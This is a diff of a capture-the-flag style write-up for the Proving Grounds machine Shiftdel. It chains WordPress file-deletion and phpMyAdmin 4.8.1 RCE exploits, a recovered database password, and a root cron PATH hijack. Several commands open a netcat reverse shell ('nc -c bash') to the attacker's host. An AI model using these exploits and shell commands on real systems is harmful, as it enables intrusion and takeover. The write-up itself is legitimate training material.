@@ -67,58 +67,58 @@ We found two accounts admin and intern but did not find plugins and themes vulne
 wpscan --url http://192.168.242.174 -e vt,vp,u1-10
 ```
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shiftdel/Shiftdel_2022.01.04_21h38m17s_001.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.04_21h38m17s_001.png)
 
 After a lot of searching, I found a vulnerability in [wordpress core](https://www.exploit-db.com/exploits/47690). We can find hidden articles by browsing the vulnerability URL. One of the articles provides the password for the ```intern``` account.
 
 ```http://192.168.169.174/?static=1&order=asc```
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shiftdel/Shiftdel_2022.01.11_01h09m45s_002.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.11_01h09m45s_002.png)
 
 When I was looking for wordpress vulnerability, I also found another [wordpress 4.9.6 vulnerability](https://www.exploit-db.com/exploits/50456), but it requires a verified account, so the credential We got early can be used here.
 
 On the other hand, the site running at port 8888 is phpMyAdmin 4.8.1. After searching, I found an available [RCE](https://www.exploit-db.com/exploits/50457) but it requires an authenticated account.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shiftdel/Shiftdel_2022.01.30_16h0m16s_003.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_16h0m16s_003.png)
 
 So we now use the aforementioned exploit to try to reset the wordpress database settings.
 
 We follow the [exploit](https://www.exploit-db.com/exploits/50456) steps. 
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shiftdel/Shiftdel_2022.01.30_16h12m33s_004.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_16h12m33s_004.png)
 
 1. Login in to wordpress admin.
 
 2. Navigates to Media > Add New > Select Files > Open/Upload
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shiftdel/Shiftdel_2022.01.30_16h18m0s_005.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_16h18m0s_005.png)
 
 3. Click Edit > Open Developer Console > Paste this exploit script (If you can't copy and paste the js function code in the console enter ```allow pasting``` first )
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shiftdel/Shiftdel_2022.01.30_16h45m9s_006.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_16h45m9s_006.png)
 
 4. Execute the function, eg: unlink_thumb("../../../../wp-config.php")
 
 We can't reset the settings because wp-config-sample.php is missing.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shiftdel/Shiftdel_2022.01.30_18h32m38s_007.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_18h32m38s_007.png)
 
 After referring to this [article](https://blog.sonarsource.com/wordpress-file-delete-to-code-execution?redirect=rips) and doing some researching I try to delete ```.htaccess``` to remove protection settings.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shiftdel/Shiftdel_2022.01.30_18h47m43s_008.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_18h47m43s_008.png)
 
 We can see the source code directly.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shiftdel/Shiftdel_2022.01.30_18h49m31s_009.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_18h49m31s_009.png)
 
 We know that wp-config.php contains the database connection settings, so we browse to wp-config.php page but it doesn't show any information, then I try to check the code
 and get the settings successfully.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shiftdel/Shiftdel_2022.01.30_19h43m2s_010.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_19h43m2s_010.png)
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shiftdel/Shiftdel_2022.01.30_19h43m22s_011.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_19h43m22s_011.png)
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shiftdel/Shiftdel_2022.01.30_19h44m0s_012.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_19h44m0s_012.png)
 
 Right now we have the database connection information, we can use the previous [RCE](https://www.exploit-db.com/exploits/50457) to get the shell.
 
@@ -126,17 +126,17 @@ Right now we have the database connection information, we can use the previous [
 python3 50457.py 192.168.227.174 8888 / wordpress ThinnerATheWaistline348 "nc -c bash 192.168.49.227 80"
 ```
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shiftdel/Shiftdel_2022.01.30_20h11m17s_013.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_20h11m17s_013.png)
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shiftdel/Shiftdel_2022.01.30_20h12m58s_014.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_20h12m58s_014.png)
 
 #### Privilege Escalation
 
 After searching for a while I found a schedule ```wpclean``` has customizing $HOME path and run by root. (hijacking PATH)
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shiftdel/Shiftdel_2022.01.30_20h22m7s_015.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_20h22m7s_015.png)
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shiftdel/Shiftdel_2022.01.30_20h34m13s_016.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_20h34m13s_016.png)
 
 We create a ```rm``` flile under ```/bin``` path.
 
@@ -148,9 +148,9 @@ echo "nc -c bash 192.168.49.227 80" > rm
 chmod +x rm
 ```
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shiftdel/Shiftdel_2022.01.30_21h9m34s_017.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_21h9m34s_017.png)
 
 Waiting for a few minutes, we get a shell.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Shiftdel/Shiftdel_2022.01.30_21h10m36s_018.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Shiftdel/Shiftdel_2022.01.30_21h10m36s_018.png)
 
